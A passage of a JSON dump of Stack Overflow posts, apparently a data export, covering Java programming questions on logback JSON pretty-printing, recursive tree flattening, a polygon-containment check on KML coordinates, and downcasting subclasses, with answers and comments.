calling <code>webView.evaluateJavascript</code> but I don't want the intent part.</p>\n<p>Is there a way to create an empty intent (<code>new Intent()</code> doesn't work) or an alternative to this method?</p>\n"},{"tags":["java","logging","logback","slf4j","circe"],"answers":[{"tags":[],"owner":{"account_id":432361,"reputation":421,"user_id":817073,"accept_rate":22,"display_name":"Ashish"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639581999,"creation_date":1639581999,"answer_id":70366234,"question_id":68303536,"body_markdown":"The following config works for me.\r\n\r\n    &lt;appender name=&quot;json&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt;\r\n        &lt;layout class=&quot;ch.qos.logback.contrib.json.classic.JsonLayout&quot;&gt;\r\n            &lt;jsonFormatter\r\n                    class=&quot;ch.qos.logback.contrib.jackson.JacksonJsonFormatter&quot;&gt;\r\n                &lt;prettyPrint&gt;true&lt;/prettyPrint&gt;\r\n            &lt;/jsonFormatter&gt;\r\n\r\n            &lt;timestampFormat&gt;yyyy-MM-dd&#39; &#39;HH:mm:ss.SSS&lt;/timestampFormat&gt;\r\n        &lt;/layout&gt;\r\n    &lt;/appender&gt;","title":"logback formatter for Pretty-print JSON","body":"<p>The following config works for me.</p>\n<pre><code>&lt;appender name=&quot;json&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt;\n    &lt;layout class=&quot;ch.qos.logback.contrib.json.classic.JsonLayout&quot;&gt;\n        &lt;jsonFormatter\n                class=&quot;ch.qos.logback.contrib.jackson.JacksonJsonFormatter&quot;&gt;\n            &lt;prettyPrint&gt;true&lt;/prettyPrint&gt;\n        &lt;/jsonFormatter&gt;\n\n        &lt;timestampFormat&gt;yyyy-MM-dd' 'HH:mm:ss.SSS&lt;/timestampFormat&gt;\n    &lt;/layout&gt;\n&lt;/appender&gt;\n</code></pre>\n"}],"owner":{"account_id":22160313,"reputation":21,"user_id":16407415,"display_name":"Ramagopal Karri"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":2153,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":1,"score":2,"last_activity_date":1639581999,"creation_date":1625754280,"question_id":68303536,"body_markdown":"**Objective:** I want my application code to log the non-pretty json as String. That is needed to keep it as one event for Splunk. However, while logging in local, with a different logback.xml if needed, I want it to pretty-print.\r\n\r\n**Tried the following:**\r\nI have tried `logstash` and `JacksonJsonFormatter`. Neither seems to be doing the pretty-print. Here are config and sample output:\r\n```\r\n          &lt;encoder class=&quot;net.logstash.logch.qos.logback.contrib.jsonback.encoder.LogstashEncoder&quot;&gt;\r\n            &lt;fieldNames&gt;\r\n                &lt;timestamp&gt;[ignore]&lt;/timestamp&gt;\r\n                &lt;level&gt;[ignore]&lt;/level&gt;\r\n                &lt;levelValue&gt;[ignore]&lt;/levelValue&gt;\r\n                &lt;thread&gt;[ignore]&lt;/thread&gt;\r\n                &lt;logger&gt;[ignore]&lt;/logger&gt;\r\n                &lt;version&gt;[ignore]&lt;/version&gt;\r\n                &lt;message/&gt;\r\n            &lt;/fieldNames&gt;\r\n            &lt;jsonFormatter class=&quot;ch.qos.logback.contrib.jackson.JacksonJsonFormatter&quot;&gt;\r\n                &lt;prettyPrint&gt;true&lt;/prettyPrint&gt;\r\n            &lt;/jsonFormatter&gt;\r\n            &amp;lt;!&amp;ndash;&lt;layout class=&quot;ch.qos.logback.contrib.json.classic.JsonLayout&quot;&gt;\r\n                &lt;jsonFormatter class=&quot;ch.qos.logback.contrib.jackson.JacksonJsonFormatter&quot;&gt;\r\n                    &lt;prettyPrint&gt;true&lt;/prettyPrint&gt;\r\n                &lt;/jsonFormatter&gt;\r\n                &lt;includeContextName&gt;false&lt;/includeContextName&gt;\r\n                &lt;appendLineSeparator&gt;false&lt;/appendLineSeparator&gt;\r\n            &lt;/layout&gt;&amp;ndash;&amp;gt;\r\n        &lt;/encoder&gt;\r\n\r\n------\r\nResults:\r\n{&quot;message&quot;:&quot;{\\&quot;interface\\&quot;:\\&quot;dynamodb client\\&quot;,\\&quot;action\\&quot;:\\&quot;test dynamodb connection\\&quot;,\\&quot;status\\&quot;:\\&quot;ok\\&quot;,\\&quot;table-status\\&quot;:\\&quot;ACTIVE\\&quot;}&quot;}\r\n``` \r\n\r\n**Request:**\r\nCan someone suggest the correction in what I am doing here or a good library that provides Encoder and Formatter that pretty-prints a JSON String before logging?\r\n\r\n**Code I have**\r\n\r\nCode: `logger.info(statusJsonStr);`\r\n\r\nlogback.xml: \r\n```\r\n&lt;encoder&gt;\r\n  &lt;pattern&gt;%message%n&lt;/pattern&gt;\r\n&lt;/encoder&gt;\r\n ```\r\n\r\nConsole log looks like this:\r\n```\r\n{&quot;interface&quot;:&quot;dynamodb client&quot;,&quot;action&quot;:&quot;test dynamodb connection&quot;,&quot;status&quot;:&quot;ok&quot;,&quot;table-status&quot;:&quot;ACTIVE&quot;}\r\n```\r\n**Libraries in classpath**\r\n```\r\ncirce                   = &quot;0.13.0&quot; //for circe-core, circe-parser, circe-jawn\r\nlogbackClassic          = &quot;1.2.3&quot; //for  logback-classic &amp; logback-core\r\n\r\n    &quot;net.logstash.logback&quot;       % &quot;logstash-logback-encoder&quot; % &quot;4.11&quot;,\r\n    &quot;ch.qos.logback.contrib&quot;     % &quot;logback-json-core&quot;        % &quot;0.1.2&quot;,\r\n    &quot;ch.qos.logback.contrib&quot;     % &quot;logback-json-classic&quot;     % &quot;0.1.2&quot;,\r\n    &quot;ch.qos.logback.contrib&quot;     % &quot;logback-jackson&quot;          % &quot;0.1.2&quot;,\r\n    &quot;com.fasterxml.jackson.core&quot; % &quot;jackson-core&quot;             % &quot;2.5.2&quot;,\r\n    &quot;com.fasterxml.jackson.core&quot; % &quot;jackson-databind&quot;         % &quot;2.5.2&quot;,\r\n    &quot;com.fasterxml.jackson.core&quot; % &quot;jackson-annotations&quot;      % &quot;2.5.2&quot;,\r\n```","title":"logback formatter for Pretty-print JSON","body":"<p><strong>Objective:</strong> I want my application code to log the non-pretty json as String. That is needed to keep it as one event for Splunk. However, while logging in local, with a different logback.xml if needed, I want it to pretty-print.</p>\n<p><strong>Tried the following:</strong>\nI have tried <code>logstash</code> and <code>JacksonJsonFormatter</code>. Neither seems to be doing the pretty-print. Here are config and sample output:</p>\n<pre><code>          &lt;encoder class=&quot;net.logstash.logch.qos.logback.contrib.jsonback.encoder.LogstashEncoder&quot;&gt;\n            &lt;fieldNames&gt;\n                &lt;timestamp&gt;[ignore]&lt;/timestamp&gt;\n                &lt;level&gt;[ignore]&lt;/level&gt;\n                &lt;levelValue&gt;[ignore]&lt;/levelValue&gt;\n                &lt;thread&gt;[ignore]&lt;/thread&gt;\n                &lt;logger&gt;[ignore]&lt;/logger&gt;\n                &lt;version&gt;[ignore]&lt;/version&gt;\n                &lt;message/&gt;\n            &lt;/fieldNames&gt;\n            &lt;jsonFormatter class=&quot;ch.qos.logback.contrib.jackson.JacksonJsonFormatter&quot;&gt;\n                &lt;prettyPrint&gt;true&lt;/prettyPrint&gt;\n            &lt;/jsonFormatter&gt;\n            &amp;lt;!&amp;ndash;&lt;layout class=&quot;ch.qos.logback.contrib.json.classic.JsonLayout&quot;&gt;\n                &lt;jsonFormatter class=&quot;ch.qos.logback.contrib.jackson.JacksonJsonFormatter&quot;&gt;\n                    &lt;prettyPrint&gt;true&lt;/prettyPrint&gt;\n                &lt;/jsonFormatter&gt;\n                &lt;includeContextName&gt;false&lt;/includeContextName&gt;\n                &lt;appendLineSeparator&gt;false&lt;/appendLineSeparator&gt;\n            &lt;/layout&gt;&amp;ndash;&amp;gt;\n        &lt;/encoder&gt;\n\n------\nResults:\n{&quot;message&quot;:&quot;{\\&quot;interface\\&quot;:\\&quot;dynamodb client\\&quot;,\\&quot;action\\&quot;:\\&quot;test dynamodb connection\\&quot;,\\&quot;status\\&quot;:\\&quot;ok\\&quot;,\\&quot;table-status\\&quot;:\\&quot;ACTIVE\\&quot;}&quot;}\n</code></pre>\n<p><strong>Request:</strong>\nCan someone suggest the correction in what I am doing here or a good library that provides Encoder and Formatter that pretty-prints a JSON String before logging?</p>\n<p><strong>Code I have</strong></p>\n<p>Code: <code>logger.info(statusJsonStr);</code></p>\n<p>logback.xml:</p>\n<pre><code>&lt;encoder&gt;\n  &lt;pattern&gt;%message%n&lt;/pattern&gt;\n&lt;/encoder&gt;\n</code></pre>\n<p>Console log looks like this:</p>\n<pre><code>{&quot;interface&quot;:&quot;dynamodb client&quot;,&quot;action&quot;:&quot;test dynamodb connection&quot;,&quot;status&quot;:&quot;ok&quot;,&quot;table-status&quot;:&quot;ACTIVE&quot;}\n</code></pre>\n<p><strong>Libraries in classpath</strong></p>\n<pre><code>circe                   = &quot;0.13.0&quot; //for circe-core, circe-parser, circe-jawn\nlogbackClassic          = &quot;1.2.3&quot; //for  logback-classic &amp; logback-core\n\n    &quot;net.logstash.logback&quot;       % &quot;logstash-logback-encoder&quot; % &quot;4.11&quot;,\n    &quot;ch.qos.logback.contrib&quot;     % &quot;logback-json-core&quot;        % &quot;0.1.2&quot;,\n    &quot;ch.qos.logback.contrib&quot;     % &quot;logback-json-classic&quot;     % &quot;0.1.2&quot;,\n    &quot;ch.qos.logback.contrib&quot;     % &quot;logback-jackson&quot;          % &quot;0.1.2&quot;,\n    &quot;com.fasterxml.jackson.core&quot; % &quot;jackson-core&quot;             % &quot;2.5.2&quot;,\n    &quot;com.fasterxml.jackson.core&quot; % &quot;jackson-databind&quot;         % &quot;2.5.2&quot;,\n    &quot;com.fasterxml.jackson.core&quot; % &quot;jackson-annotations&quot;      % &quot;2.5.2&quot;,\n</code></pre>\n"},{"tags":["java","recursion","tree"],"comments":[{"owner":{"account_id":27505,"reputation":32693,"user_id":72673,"accept_rate":72,"display_name":"Maurice Perry"},"score":0,"creation_date":1639576476,"post_id":70364517,"comment_id":124383765,"body_markdown":"You may or maynot use recursion","body":"You may or maynot use recursion"}],"answers":[{"tags":[],"owner":{"account_id":1476158,"reputation":79,"user_id":1386502,"display_name":"Emad Easa"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639576969,"creation_date":1639576969,"answer_id":70365035,"question_id":70364517,"body_markdown":"The usual pattern you might use for problems like this is comparable with the ones to linked lists.\r\nIf you want to search through a binary tree then you might add the left and the right child of each node as it&#180;s class attributes and have functions which return you those nodes like this:\r\n\r\n    class Node\r\n    {\r\n      Node leftChild;\r\n      Node rightChild;\r\n      string nodesUrl;\r\n    \r\n      // make the same function for right child\r\n      public void setLeftChild(Node leftChild)\r\n      {\r\n        this.leftChild = leftChild;\r\n      }\r\n    \r\n      // make the same function for right child\r\n      public Node getLeftChild()\r\n      {\r\n        return leftChild;\r\n      }\r\n\r\n      // make here functions for setting and getting the node&#180;s url\r\n    }\r\n\r\nSince each node will have referenced it`s childs you can go for example as long to the left child, till you find the url you need. If you arrived at the end of the tree without success, you have to try each rightChild of each node you passed and repeat this process. This can be achieved by a recursive function, which is usually used to search through trees.\r\n\r\n    Node getNodeWithSearchingUrl(Node rootNode, string searchUrl)\r\n    {\r\n      Node leftChild = rootNode.getLeftChild();\r\n      Node rightChild = rootNode.getRightChild();\r\n    \r\n      Node foundNode = null;\r\n    \r\n      if(rootNode != null &amp;&amp; rootNode.getUrl().Equals(searchUrl))\r\n      {\r\n        return rootNode;\r\n      }\r\n      \r\n      if(leftChild != null)\r\n      {\r\n        foundNode = getNodeWithSearchingUrl(leftChild, searchUrl);\r\n      }\r\n      \r\n      if(foundNode == null &amp;&amp; rightChild != null)\r\n      {\r\n        foundNode = getNodeWithSearchingUrl(rightChild, searchUrl);     \r\n      }\r\n    \r\n      return foundNode;\r\n    }\r\n\r\nI did not try the code but I think it should work. If you have trees which are not binary but &quot;multilevel&quot;, then instead of saving only the left and right child you need to save all children in a list and always run through the whole list with your recursive function.","title":"How to recursively traverse a potentially infinite tree","body":"<p>The usual pattern you might use for problems like this is comparable with the ones to linked lists.\nIf you want to search through a binary tree then you might add the left and the right child of each node as it´s class attributes and have functions which return you those nodes like this:</p>\n<pre><code>class Node\n{\n  Node leftChild;\n  Node rightChild;\n  string nodesUrl;\n\n  // make the same function for right child\n  public void setLeftChild(Node leftChild)\n  {\n    this.leftChild = leftChild;\n  }\n\n  // make the same function for right child\n  public Node getLeftChild()\n  {\n    return leftChild;\n  }\n\n  // make here functions for setting and getting the node´s url\n}\n</code></pre>\n<p>Since each node will have referenced it`s childs you can go for example as long to the left child, till you find the url you need. If you arrived at the end of the tree without success, you have to try each rightChild of each node you passed and repeat this process. This can be achieved by a recursive function, which is usually used to search through trees.</p>\n<pre><code>Node getNodeWithSearchingUrl(Node rootNode, string searchUrl)\n{\n  Node leftChild = rootNode.getLeftChild();\n  Node rightChild = rootNode.getRightChild();\n\n  Node foundNode = null;\n\n  if(rootNode != null &amp;&amp; rootNode.getUrl().Equals(searchUrl))\n  {\n    return rootNode;\n  }\n  \n  if(leftChild != null)\n  {\n    foundNode = getNodeWithSearchingUrl(leftChild, searchUrl);\n  }\n  \n  if(foundNode == null &amp;&amp; rightChild != null)\n  {\n    foundNode = getNodeWithSearchingUrl(rightChild, searchUrl);     \n  }\n\n  return foundNode;\n}\n</code></pre>\n<p>I did not try the code but I think it should work. If you have trees which are not binary but &quot;multilevel&quot;, then instead of saving only the left and right child you need to save all children in a list and always run through the whole list with your recursive function.</p>\n"},{"tags":[],"owner":{"account_id":20240228,"reputation":496,"user_id":14844306,"display_name":"Ben Anderson"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1639581776,"creation_date":1639581776,"answer_id":70366177,"question_id":70364517,"body_markdown":"You can write a method which takes in `Node` and returns a list of nodes using recursion.\r\n```\r\npublic List&lt;Node&gt; flattenNodes(Node node) {\r\n    LinkedList&lt;Node&gt; nodes = new LinkedList&lt;&gt;();\r\n    //recursively add the result of flattening children to nodes list\r\n    node.getChildren().forEach(n -&gt; {\r\n        nodes.addAll(flattenNodes(n));\r\n    });\r\n    //add the current node to nodes list too\r\n    nodes.add(node);\r\n    return nodes;\r\n}\r\n```\r\n\r\nThis assumes the `Node` class has a `getChildren` method to get the children of the node as a list.\r\n\r\nHere is node class I used when writing this solution:\r\n```\r\npublic class Node {\r\n    private final String url;\r\n    private final List&lt;Node&gt; children;\r\n\r\n    public Node(String url, List&lt;Node&gt; children) {\r\n        this.url = url;\r\n        this.children = children;\r\n    }\r\n\r\n    public List&lt;Node&gt; getChildren() {\r\n        return children;\r\n    }\r\n\r\n    public String getUrl() {\r\n        return url;\r\n    }\r\n}\r\n```\r\n\r\n----------\r\n\r\nI tested the solution using the following code:\r\n```\r\nNode aaa = new Node(&quot;www.aaa.com&quot;, new LinkedList&lt;Node&gt;());\r\nNode aa = new Node(&quot;www.aa.com&quot;, List.of(aaa));\r\nNode a = new Node(&quot;www.a.com&quot;, List.of(aa));\r\nNode bb = new Node(&quot;www.bb.com&quot;, new LinkedList&lt;Node&gt;());\r\nNode b = new Node(&quot;www.b.com&quot;, List.of(bb));\r\nNode head = new Node(&quot;www.google.com&quot;, List.of(a, b));\r\n\r\nflattenNodes(head).forEach(node -&gt; System.out.println(node.getUrl()));\r\n```\r\nRunning this test printed the following to console:\r\n```\r\nwww.aaa.com\r\nwww.aa.com\r\nwww.a.com\r\nwww.bb.com\r\nwww.b.com\r\nwww.google.com\r\n```","title":"How to recursively traverse a potentially infinite tree","body":"<p>You can write a method which takes in <code>Node</code> and returns a list of nodes using recursion.</p>\n<pre><code>public List&lt;Node&gt; flattenNodes(Node node) {\n    LinkedList&lt;Node&gt; nodes = new LinkedList&lt;&gt;();\n    //recursively add the result of flattening children to nodes list\n    node.getChildren().forEach(n -&gt; {\n        nodes.addAll(flattenNodes(n));\n    });\n    //add the current node to nodes list too\n    nodes.add(node);\n    return nodes;\n}\n</code></pre>\n<p>This assumes the <code>Node</code> class has a <code>getChildren</code> method to get the children of the node as a list.</p>\n<p>Here is node class I used when writing this solution:</p>\n<pre><code>public class Node {\n    private final String url;\n    private final List&lt;Node&gt; children;\n\n    public Node(String url, List&lt;Node&gt; children) {\n        this.url = url;\n        this.children = children;\n    }\n\n    public List&lt;Node&gt; getChildren() {\n        return children;\n    }\n\n    public String getUrl() {\n        return url;\n    }\n}\n</code></pre>\n<hr />\n<p>I tested the solution using the following code:</p>\n<pre><code>Node aaa = new Node(&quot;www.aaa.com&quot;, new LinkedList&lt;Node&gt;());\nNode aa = new Node(&quot;www.aa.com&quot;, List.of(aaa));\nNode a = new Node(&quot;www.a.com&quot;, List.of(aa));\nNode bb = new Node(&quot;www.bb.com&quot;, new LinkedList&lt;Node&gt;());\nNode b = new Node(&quot;www.b.com&quot;, List.of(bb));\nNode head = new Node(&quot;www.google.com&quot;, List.of(a, b));\n\nflattenNodes(head).forEach(node -&gt; System.out.println(node.getUrl()));\n</code></pre>\n<p>Running this test printed the following to console:</p>\n<pre><code>www.aaa.com\nwww.aa.com\nwww.a.com\nwww.bb.com\nwww.b.com\nwww.google.com\n</code></pre>\n"}],"owner":{"account_id":14354817,"reputation":626,"user_id":10369064,"display_name":"Sheen"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":355,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"accepted_answer_id":70366177,"answer_count":2,"score":0,"last_activity_date":1639581776,"creation_date":1639574891,"question_id":70364517,"body_markdown":"I have an object\r\n\r\n```\r\nNode(String url, List&lt;Node&gt; children);\r\n```\r\n\r\nNow this could be several levels deep, ie\r\n\r\n```\r\nNode node1 = new Node (&quot;www.google.com&quot;, new List&lt;Node&gt;())) (That list would contain more nodes, etc etc.\r\n```\r\n\r\nI want to traverse and flatten the tree, such that I can extract all the url values to a single list. I think I need recursion for this, however I can&#39;t work out how to do so.","title":"How to recursively traverse a potentially infinite tree","body":"<p>I have an object</p>\n<pre><code>Node(String url, List&lt;Node&gt; children);\n</code></pre>\n<p>Now this could be several levels deep, ie</p>\n<pre><code>Node node1 = new Node (&quot;www.google.com&quot;, new List&lt;Node&gt;())) (That list would contain more nodes, etc etc.\n</code></pre>\n<p>I want to traverse and flatten the tree, such that I can extract all the url values to a single list. I think I need recursion for this, however I can't work out how to do so.</p>\n"},{"tags":["java","android","geometry","location","polygon"],"comments":[{"owner":{"account_id":7846813,"reputation":1118,"user_id":8634018,"display_name":"Dominik Mokriš"},"score":0,"creation_date":1639855857,"post_id":70366119,"comment_id":124456856,"body_markdown":"Are you sure you don&#39;t have the latitude and longitude swapped anywhere? That would mean the point would be somewhere near Brasov, Romania. If this does not help, would you mind providing [a minimal reproducible example](https://stackoverflow.com/help/minimal-reproducible-example)?","body":"Are you sure you don&#39;t have the latitude and longitude swapped anywhere? That would mean the point would be somewhere near Brasov, Romania. If this does not help, would you mind providing <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">a minimal reproducible example</a>?"},{"owner":{"account_id":16630534,"reputation":66,"user_id":12018485,"display_name":"Yahya Alborene"},"score":0,"creation_date":1639904874,"post_id":70366119,"comment_id":124463364,"body_markdown":"@DominikMokriš \nI&#39;m sure every thing is correct\nI got LatLng from map","body":"@DominikMokriš  I&#39;m sure every thing is correct I got LatLng from map"}],"owner":{"account_id":16630534,"reputation":66,"user_id":12018485,"display_name":"Yahya Alborene"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":124,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1639581508,"creation_date":1639581508,"question_id":70366119,"body_markdown":"I have a list of polygons that I read from **kml** file\r\n\r\n    List&lt;LatLng&gt; polygon = new ArrayList&lt;&gt;();\r\n    for (Point p:placemark.getPoint()) {\r\n        l = new LatLng(p.getLatitude(),p.getLongitude());\r\n        polygon.add(l);    \r\n    }\r\n\r\nThose are the points in **KML**\r\n\r\n    &lt;coordinates&gt;\r\n              46.7614175,24.7143556,0\r\n              46.7639557,24.7113615,0\r\n              46.7659298,24.7083206,0\r\n              46.7676464,24.7058254,0\r\n              46.7707363,24.7014588,0\r\n              46.7727962,24.6959223,0\r\n              46.7747703,24.6911654,0\r\n              46.7764869,24.6850046,0\r\n              46.7770019,24.6792334,0\r\n              46.7933098,24.6842247,0\r\n              46.8056694,24.6906195,0\r\n              46.8183723,24.6960783,0\r\n              46.8327919,24.7034082,0\r\n              46.8470707,24.7123565,0\r\n              46.8565979,24.7183601,0\r\n              46.8627777,24.7215567,0\r\n              46.8653526,24.7281055,0\r\n              46.8637218,24.732783,0\r\n              46.8588734,24.7393914,0\r\n              46.8556977,24.7438347,0\r\n              46.8513203,24.7493691,0\r\n              46.8483162,24.7539678,0\r\n              46.8450547,24.7595797,0\r\n              46.8417931,24.7651913,0\r\n              46.8381024,24.7619179,0\r\n              46.8267727,24.7549811,0\r\n              46.8082811,24.7435125,0\r\n              46.791115,24.732443,0\r\n              46.779957,24.7258944,0\r\n              46.7614175,24.7143556,0\r\n    &lt;/coordinates&gt;\r\n\r\nAfter that I&#39;m checking user location if it&#39;s inside this polygons or not like this:\r\n\r\n    if (PolyUtil.containsLocation(userLatLng,polygon,false)){\r\n    }\r\n\r\nBut it returns false even it&#39;s inside Like this\r\n\r\n[![enter image description here][1]][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/DZqru.jpg\r\n\r\nI&#39;m sure `userLatLng != null` and **polygon not empty**","title":"PolyUtil.containsLocation() returns wrong value","body":"<p>I have a list of polygons that I read from <strong>kml</strong> file</p>\n<pre><code>List&lt;LatLng&gt; polygon = new ArrayList&lt;&gt;();\nfor (Point p:placemark.getPoint()) {\n    l = new LatLng(p.getLatitude(),p.getLongitude());\n    polygon.add(l);    \n}\n</code></pre>\n<p>Those are the points in <strong>KML</strong></p>\n<pre><code>&lt;coordinates&gt;\n          46.7614175,24.7143556,0\n          46.7639557,24.7113615,0\n          46.7659298,24.7083206,0\n          46.7676464,24.7058254,0\n          46.7707363,24.7014588,0\n          46.7727962,24.6959223,0\n          46.7747703,24.6911654,0\n          46.7764869,24.6850046,0\n          46.7770019,24.6792334,0\n          46.7933098,24.6842247,0\n          46.8056694,24.6906195,0\n          46.8183723,24.6960783,0\n          46.8327919,24.7034082,0\n          46.8470707,24.7123565,0\n          46.8565979,24.7183601,0\n          46.8627777,24.7215567,0\n          46.8653526,24.7281055,0\n          46.8637218,24.732783,0\n          46.8588734,24.7393914,0\n          46.8556977,24.7438347,0\n          46.8513203,24.7493691,0\n          46.8483162,24.7539678,0\n          46.8450547,24.7595797,0\n          46.8417931,24.7651913,0\n          46.8381024,24.7619179,0\n          46.8267727,24.7549811,0\n          46.8082811,24.7435125,0\n          46.791115,24.732443,0\n          46.779957,24.7258944,0\n          46.7614175,24.7143556,0\n&lt;/coordinates&gt;\n</code></pre>\n<p>After that I'm checking user location if it's inside this polygons or not like this:</p>\n<pre><code>if (PolyUtil.containsLocation(userLatLng,polygon,false)){\n}\n</code></pre>\n<p>But it returns false even it's inside Like this</p>\n<p><a href=\"https://i.stack.imgur.com/DZqru.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/DZqru.jpg\" alt=\"enter image description here\" /></a></p>\n<p>I'm sure <code>userLatLng != null</code> and <strong>polygon not empty</strong></p>\n"},{"tags":["java","oop","casting"],"comments":[{"owner":{"account_id":1937019,"reputation":4428,"user_id":1744230,"accept_rate":100,"display_name":"QBrute"},"score":1,"creation_date":1639581494,"post_id":70366015,"comment_id":124386151,"body_markdown":"If you&#39;re in need of different behavior for each of your child classes, define an `abstract` method in `MyStruct` (for example a generic `executeAction` or so), then override that method in each child class. Then, all you need to do is `structs.forEach(MyStruct::executeAction);` or something similar, depending on what you need to return","body":"If you&#39;re in need of different behavior for each of your child classes, define an <code>abstract</code> method in <code>MyStruct</code> (for example a generic <code>executeAction</code> or so), then override that method in each child class. Then, all you need to do is <code>structs.forEach(MyStruct::executeAction);</code> or something similar, depending on what you need to return"},{"owner":{"account_id":11381766,"reputation":452,"user_id":8344485,"display_name":"juwil"},"score":1,"creation_date":1639581867,"post_id":70366015,"comment_id":124386327,"body_markdown":"If you are using recent jdk 17, you could switch instead of if-else. But @Qbrute &#39;s approach is the better one.","body":"If you are using recent jdk 17, you could switch instead of if-else. But @Qbrute &#39;s approach is the better one."},{"owner":{"account_id":16969411,"reputation":51,"user_id":12274442,"display_name":"nikhrom"},"score":0,"creation_date":1639636817,"post_id":70366015,"comment_id":124400880,"body_markdown":"@QBrute, thank you very much for your answer.  This solution is suitable if all structures have a common behavior that should be applied for each (for example, the draw() method for shapes).  But imagine, for example, that you have an array of shapes, and among the whole huge array of shapes, you need to display ONLY the radius of the circle and ONLY the diagonal of the square and nothing more. My situation is similar.","body":"@QBrute, thank you very much for your answer.  This solution is suitable if all structures have a common behavior that should be applied for each (for example, the draw() method for shapes).  But imagine, for example, that you have an array of shapes, and among the whole huge array of shapes, you need to display ONLY the radius of the circle and ONLY the diagonal of the square and nothing more. My situation is similar."},{"owner":{"account_id":3211603,"reputation":289297,"user_id":2711488,"display_name":"Holger"},"score":3,"creation_date":1639650141,"post_id":70366015,"comment_id":124405190,"body_markdown":"Search for the “Visitor Pattern”","body":"Search for the “Visitor Pattern”"},{"owner":{"account_id":9266429,"reputation":546,"user_id":6881773,"display_name":"S.Sachith"},"score":0,"creation_date":1641790405,"post_id":70366015,"comment_id":124889830,"body_markdown":"@Holger is it possible to implement using strategy pattern?","body":"@Holger is it possible to implement using strategy pattern?"},{"owner":{"account_id":3211603,"reputation":289297,"user_id":2711488,"display_name":"Holger"},"score":2,"creation_date":1641807154,"post_id":70366015,"comment_id":124893837,"body_markdown":"@S.Sachith A Visitor is a kind of Strategy, so there’s no contradiction with it. But the Visitor Pattern is the one which tells you how you can provide different implementations for the subclasses.","body":"@S.Sachith A Visitor is a kind of Strategy, so there’s no contradiction with it. But the Visitor Pattern is the one which tells you how you can provide different implementations for the subclasses."}],"owner":{"account_id":16969411,"reputation":51,"user_id":12274442,"display_name":"nikhrom"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":72,"favorite_count":0,"down_vote_count":0,"up_vote_count":4,"answer_count":0,"score":4,"last_activity_date":1639581076,"creation_date":1639581076,"question_id":70366015,"body_markdown":"There is a data block containing continuous packed data of structures of different types. It is necessary to read this data into an array. \r\nIt was programmed like this:\r\n\r\n```\r\nclass Handler{\r\n    //...\r\n    public List&lt;MyStruct&gt; getMyStructs(){\r\n        // when processing, some subsequent data depends on the \r\n        // processing of the previous ones\r\n    }\r\n\r\n    //...\r\n}\r\n\r\nabstract class MyStruct{ \r\n    // Common method implementations for all structs \r\n}\r\n\r\nclass ImpulsOne extends MyStruct{\r\n    // declaring and init fields \r\n    // methods\r\n}\r\n\r\nclass ImpulsTwo extends MyStruct{\r\n    // declaring and init fields\r\n    // methods\r\n}\r\n\r\n//and etc...\r\n```\r\n\r\nAfter we have received the List&lt;MyStruct&gt;, we live and enjoy life using the common methods that are in MyStruct.But this happens as long as there is no task to pull out and display or process several fields from several structures of certain types. There can be many such processing, and, unfortunately, each depends on the results of the previous processing. \r\n\r\nThe only thing I came up with is to do a downcast with each processing:\r\n```\r\n//...\r\n    SomeResult processing1(List&lt;MyStruct&gt; structs){\r\n        //...\r\n        for(var struct: structs){\r\n           if(struct instanceof ImpulsOne){\r\n                ImpulsOne impuls = (ImpulsOne) struct\r\n                // extracting fields and processing\r\n           }else if(struct instanceof ImpulsTwo){\r\n                ImpulsTwo = (ImpulsTwo) struct\r\n                // extracting fields and processing\r\n           }\r\n\r\n           // and many many else-if\r\n        }\r\n    }\r\n//...\r\n```\r\nI don&#39;t like this approach and I&#39;m sure it can be made easier.\r\n\r\nI hope I have clearly explained the whole essence of the problem. Have you faced a similar problem? What ideas do you have to simplify the code?\r\n\r\nThanks.\r\n","title":"down casting polimorphic objects","body":"<p>There is a data block containing continuous packed data of structures of different types. It is necessary to read this data into an array.\nIt was programmed like this:</p>\n<pre><code>class Handler{\n    //...\n    public List&lt;MyStruct&gt; getMyStructs(){\n        // when processing, some subsequent data depends on the \n        // processing of the previous ones\n    }\n\n    //...\n}\n\nabstract class MyStruct{ \n    // Common method implementations for all structs \n}\n\nclass ImpulsOne extends MyStruct{\n    // declaring and init fields \n    // methods\n}\n\nclass ImpulsTwo extends MyStruct{\n    // declaring and init fields\n    // methods\n}\n\n//and etc...\n</code></pre>\n<p>After we have received the List, we live and enjoy life using the common methods that are in MyStruct.But this happens as long as there is no task to pull out and display or process several fields from several structures of certain types. There can be many such processing, and, unfortunately, each depends on the results of the previous processing.</p>\n<p>The only thing I came up with is to do a downcast with each processing:</p>\n<pre><code>//...\n    SomeResult processing1(List&lt;MyStruct&gt; structs){\n        //...\n        for(var struct: structs){\n           if(struct instanceof ImpulsOne){\n                ImpulsOne impuls = (ImpulsOne) struct\n                // extracting fields and processing\n           }else if(struct instanceof ImpulsTwo){\n                ImpulsTwo = (ImpulsTwo) struct\n                // extracting fields and processing\n           }\n\n           // and many many else-if\n        }\n    }\n//...\n</code></pre>\n<p>I don't like this approach and I'm sure it can be made easier.</p>\n<p>I hope I have clearly explained the whole essence of the problem. Have you faced a similar problem? What ideas do you have to simplify the code?</p>\n<p>Thanks.</p>\n"},{"tags":["java","log4j2"],"answers":[{"tags":[],"owner":{"account_id":1891192,"reputation":8826,"user_id":1709216,"display_name":"rgoers"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1615270529,"creation_date":1615270529,"answer_id":66541733,"question_id":66522340,"body_markdown":"I would suggest you try\r\n\r\n    File file = new 